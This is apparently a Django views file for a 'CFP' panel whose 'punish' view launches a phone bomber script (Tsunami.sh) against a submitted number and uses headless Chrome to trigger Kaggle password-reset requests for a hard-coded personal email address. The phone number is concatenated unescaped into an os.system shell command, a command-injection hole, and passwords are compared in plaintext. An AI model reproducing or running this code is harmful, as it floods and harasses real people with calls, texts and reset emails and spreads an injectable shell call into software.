from django.shortcuts import render
from django.http import HttpResponse
import os
from .models import CFPUsers
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
# Create your views here.

def index(request):
    #return HttpResponse("CFP")
    return render(request,'index.html')

def Login(request):
    uname = request.POST.get('UName')
    Email = request.POST.get('email')
    pswd = request.POST.get('pswd')
    # retrieving PhoneNo from SpamUsers Model
    UName_list = [u.UName for u in CFPUsers.objects.all()]
    # check if  exist in SpamUser Model
    if uname in UName_list:
        ucred = CFPUsers.objects.get(UName=uname)
        if pswd == ucred.password:
            #return HttpResponse("CFP Login Success")
            return render(request,'CFP_Panel.html')
        else:
            return HttpResponse("Email or Password Wrong... Enter Correct details")
    else:
        return HttpResponse("You Don't have permission, Contact CyberSapiens")

def punish(request):
   try:
    phno = request.POST.get('PhoneNo')
    email = request.POST.get('Email')

    print(phno)
    print(email)

    if phno:
        os.system("chmod +x ./static/Bomber/Tsunami.sh")
        os.system("printf '" + phno + "\n1\n' | ./static/Bomber/Tsunami.sh")
        return HttpResponse("<h2>Attacking on " + phno + "</h2>")
    elif email:
        print(type(email))
        chrome_options = webdriver.ChromeOptions()
        chrome_options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--no-sandbox")
        driver = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"), chrome_options=chrome_options)




   except Exception as e:
       print(str(e))
       return HttpResponse("<h2>Attacking on finished</h2>")

   driver.get("https://www.kaggle.com/account/login?phase=startPasswordReset&returnUrl=%2F")
   print("driver.page_source")
   #print(driver.page_source)

   tf = driver.find_element(By.CLASS_NAME,"mdc-text-field__input")
   print(tf)
   tf.send_keys("sanjayhegde2017@gmail.com")
   sub = driver.find_element(By.CLASS_NAME,"mdc-text-field__input")
   sub.click()

   return render(request, 'CFP_Panel.html')
